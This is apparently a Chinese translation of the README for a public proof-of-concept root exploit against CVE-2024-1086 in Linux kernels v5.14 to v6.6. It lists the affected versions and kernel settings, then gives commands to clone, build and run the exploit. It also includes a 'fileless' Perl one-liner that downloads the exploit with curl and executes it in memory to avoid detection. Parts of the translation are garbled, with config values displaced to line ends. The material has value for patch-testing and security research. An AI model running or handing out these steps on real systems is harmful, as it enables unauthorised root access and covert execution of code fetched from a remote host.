针对 CVE-2024-1086的通用本地权限提升概念验证漏洞，适用于 v5.14 和 v6.6 之间的大多数 Linux 内核，包括 Debian、Ubuntu 和 KernelCTF。KernelCTF 映像的成功率为 99.4%。

## 受影响的版本



该漏洞影响从（包括）v5.14 到 v6.6 的版本，不包括已修补的分支 v5.15.149>、v6.1.76>、v6.6.15>。这些版本的补丁于 2024 年 2 月发布。该基础漏洞影响从 v3.15 到 v6.8-rc1 的所有版本（不包括已修补的稳定分支）。

**警告：**

- 该漏洞在带有 kconfig 的 v6.4> 内核（包括 Ubuntu v6.5）上不起作用`CONFIG_INIT_ON_ALLOC_DEFAULT_ON=y`
- 这些漏洞需要用户命名空间 （kconfig ），这些用户命名空间是非特权的 （sh command = 1），并且 nf_tables 已启用 （kconfig ）。默认情况下，这些都在 Debian、Ubuntu 和 KernelCTF 上启用。其他发行版尚未经过测试，但也可能正常工作。此外，该漏洞仅在 x64/amd64 上进行了测试。`CONFIG_USER_NS=y``sysctl kernel.unprivileged_userns_clone``CONFIG_NF_TABLES=y`
- 该漏洞在具有大量网络活动的系统上*可能非常*不稳定
  - 带有WiFi适配器的系统，当被高使用率的WiFi网络包围时，会非常不稳定。
  - 在测试设备上，请通过BIOS关闭WiFi适配器。
- 运行漏洞利用后的内核崩溃（系统崩溃）是一种副作用，故意没有修复以防止恶意使用漏洞（即，利用尝试现在应该更加明显，并且在实际操作中不切实际）。尽管如此，它仍然允许在实验室环境中进行工作的概念验证，因为 root shell 是正常工作的，并且可以通过磁盘进行持久性。

## 用法



### 配置



默认值应该在带有本地 shell 的 Debian、Ubuntu 和 KernelCTF 上开箱即用。在未经测试的安装/发行版上，请确保 kconfig 值与目标内核匹配。这些可以在 [`src/config.h`](https://github.com/Notselwyn/CVE-2024-1086/blob/main/src/config.h) 中指定。如果在物理内存超过 32GiB 的计算机上运行此漏洞，请确保增加 . 如果通过 SSH（进入测试计算机）或反向 shell 运行漏洞，则可能需要切换到 以避免不必要的网络活动。`CONFIG_PHYS_MEM``CONFIG_REDIRECT_LOG``1`

### 建筑



如果这对您来说不切实际，则可以使用默认配置进行编译的 x64 二进制文件

```
git clone https://github.com/Notselwyn/CVE-2024-1086
cd CVE-2024-1086
make
```

二元的：`CVE-2024-1086/exploit`

### 运行



运行漏洞利用同样简单：

```
./exploit
```



还支持无文件执行，以防需要避免检测的渗透测试情况。但是，Perl 需要安装在目标上：

```
perl -e '
  require qw/syscall.ph/;

  my $fd = syscall(SYS_memfd_create(), $fn, 0);
  system "curl https://example.com/exploit -s >&$fd";
  exec {"/proc/$$/fd/$fd"} "memfd";
'
```